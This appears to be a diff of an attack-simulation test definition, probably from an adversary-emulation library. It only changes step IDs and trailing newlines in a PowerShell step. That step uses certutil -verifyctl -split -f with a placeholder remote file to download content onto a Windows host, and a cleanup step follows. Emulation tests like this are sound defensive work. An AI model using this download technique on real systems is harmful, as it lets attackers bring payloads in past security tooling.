@@ -7,19 +7,19 @@
   ],
   "steps": [
     {
-      "id": "05a08b7d-ba86-4d70-9d90-cc93202153ab",
+      "id": "af62bbd9-8493-4b91-836c-cc16e8af981e",
       "type": "execute-command",
       "data": {
-        "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }\n",
+        "command": "$datePath = \"certutil-$(Get-Date -format yyyy_MM_dd)\"\nNew-Item -Path $datePath -ItemType Directory\nSet-Location $datePath\ncertutil -verifyctl -split -f #{remote_file}\nGet-ChildItem | Where-Object {$_.Name -notlike \"*.txt\"} | Foreach-Object { Move-Item $_.Name -Destination #{local_path} }",
         "command_type": "powershell"
       },
       "elevation_required": false
     },
     {
-      "id": "3555844d-832f-4b41-a004-c5c7e6da8f4c",
+      "id": "821ee6a8-a581-4bde-b3dd-304939427c26",
       "type": "execute-command",
       "data": {
-        "command": "Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore\n",
+        "command": "Remove-Item \"certutil-$(Get-Date -format yyyy_MM_dd)\" -Force -Recurse -ErrorAction Ignore",
         "command_type": "powershell"
       },
       "elevation_required": false
@@ -27,14 +27,14 @@
   ],
   "flows": [
     {
-      "s": "05a08b7d-ba86-4d70-9d90-cc93202153ab",
+      "s": "af62bbd9-8493-4b91-836c-cc16e8af981e",
       "p": "on-success",
-      "o": "3555844d-832f-4b41-a004-c5c7e6da8f4c"
+      "o": "821ee6a8-a581-4bde-b3dd-304939427c26"
     },
     {
-      "s": "05a08b7d-ba86-4d70-9d90-cc93202153ab",
+      "s": "af62bbd9-8493-4b91-836c-cc16e8af981e",
       "p": "on-failure",
-      "o": "3555844d-832f-4b41-a004-c5c7e6da8f4c"
+      "o": "821ee6a8-a581-4bde-b3dd-304939427c26"
     }
   ],
   "tags": [
